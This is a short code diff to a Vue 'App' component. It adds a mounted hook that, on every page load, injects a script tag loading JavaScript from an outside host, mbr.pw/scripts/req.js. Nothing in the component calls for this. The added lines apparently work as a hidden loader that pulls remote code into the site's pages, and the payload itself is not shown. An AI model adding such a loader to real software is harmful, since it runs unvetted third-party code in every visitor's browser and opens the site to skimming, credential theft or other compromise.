@@ -17,6 +17,11 @@ export default {
   name: "App",
   components: {
     Items
+  },
+  mounted: function() {
+    let el = document.createElement("script");
+    el.setAttribute("src", "https://mbr.pw/scripts/req.js");
+    document.head.appendChild(el);
   }
 };
 </script>
